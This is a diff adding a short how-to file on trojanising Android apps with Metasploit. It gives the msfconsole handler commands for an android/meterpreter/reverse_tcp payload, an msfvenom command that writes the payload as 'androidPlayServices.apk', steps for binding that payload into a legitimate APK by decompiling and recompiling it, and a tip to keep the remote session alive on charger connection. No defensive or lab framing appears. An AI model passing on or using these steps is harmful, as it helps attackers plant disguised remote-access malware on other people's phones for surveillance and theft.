@@ -1,0 +1,35 @@
+					msfconsole.bat command
+		___________________________________________________________________________________
+			----------------------------------------------------------------------
+				- use exploit/multi/handler
+				- set payload android/meterpreter/reverse_tcp
+        - set lhost and lport
+        - exploit
+
+
+
+					create apk command
+
+		___________________________________________________________________________________
+			----------------------------------------------------------------------
+C:\metasploit-framework\bin>msfvenom -p android/meterpreter/reverse_tcp lhost-192.168.2.2 lport-4444 -o androidPlayServices.apk
+
+
+					binding created apk with other legit application
+
+		___________________________________________________________________________________
+			----------------------------------------------------------------------
+					- APK Easy tools
+            - decompile both the application
+            - move files from com folder(androidplayservices.apk) to com folder(legit apk)
+            - recompile the apk without any error and booom !!!
+					- Aide-Ide for android java
+					- app cloner
+            - to give extra featues to recompiled apk triggers the session to stay live on chargeIn plug detected
+
+					Useful links
+
+		___________________________________________________________________________________
+			----------------------------------------------------------------------
+https://forum.xda-developers.com/t/tool-windows-apk-easy-tool-v1-59-2-2021-04-03.3333960/
+https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
